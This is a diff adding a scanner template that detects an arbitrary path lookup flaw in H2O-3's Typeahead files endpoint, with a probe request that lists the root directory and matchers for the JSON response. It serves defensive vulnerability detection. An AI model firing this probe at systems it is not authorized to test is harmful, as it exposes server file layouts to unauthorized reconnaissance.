@@ -1,0 +1,38 @@
+id: "h2o-arbitary-file-read"
+name: "H2O - Arbitrary Path Lookup"
+severity: "medium"
+description: "H2O allows for arbitrary path lookup via it's Typehead API endpoint"
+tech:
+  - "generic"
+tags:
+  - "h2o-3"
+  - "h2o"
+  - "info-leak"
+  - "lfi"
+  - "misconfig"
+  - "vuln"
+cwe: "CWE-200"
+reference: "https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/3/Typeahead/files?src=%2F&limit=10"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "\"/bin\""
+      - "\"__meta\":"
+      - "\"schema_name\":"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "application/json"
+  - type: "status"
+    status:
+      - 200
